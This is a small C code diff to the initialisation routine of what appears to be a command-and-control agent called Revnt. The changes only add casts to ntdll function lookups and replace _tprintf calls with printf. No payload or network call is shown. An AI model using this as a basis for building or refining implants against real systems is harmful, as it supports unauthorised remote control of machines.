@@ -14,14 +14,15 @@ VOID RevntInit()
     Instance.Config.Transport.Secure    = CONFIG_PORT;
 
     // Init Win32
-    Instance.Win32.RtlRandomEx   = GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlRandomEx" );
-    Instance.Win32.RtlGetVersion = GetProcAddress( GetModuleHandleA( "ntdll" ), "RtlGetVersion" );
+    Instance.Win32.RtlRandomEx   = (ULONG (*)(PULONG)) GetProcAddress(GetModuleHandleA("ntdll"), "RtlRandomEx");
+    Instance.Win32.RtlGetVersion = (void (*)(POSVERSIONINFOEXW)) GetProcAddress(GetModuleHandleA("ntdll"),
+                                                                                "RtlGetVersion");
 
     Instance.Session.AgentID = RandomNumber32();
     Instance.Config.Sleeping = CONFIG_SLEEP;
 
-    _tprintf( "AgentID     => %x\n", Instance.Session.AgentID );
-    _tprintf( "Magic Value => %x\n", REVNT_MAGIC_VALUE );
+    printf( "AgentID     => %x\n", Instance.Session.AgentID );
+    printf( "Magic Value => %x\n", REVNT_MAGIC_VALUE );
 }
 
 VOID AnonPipeRead( HANDLE hSTD_OUT_Read )
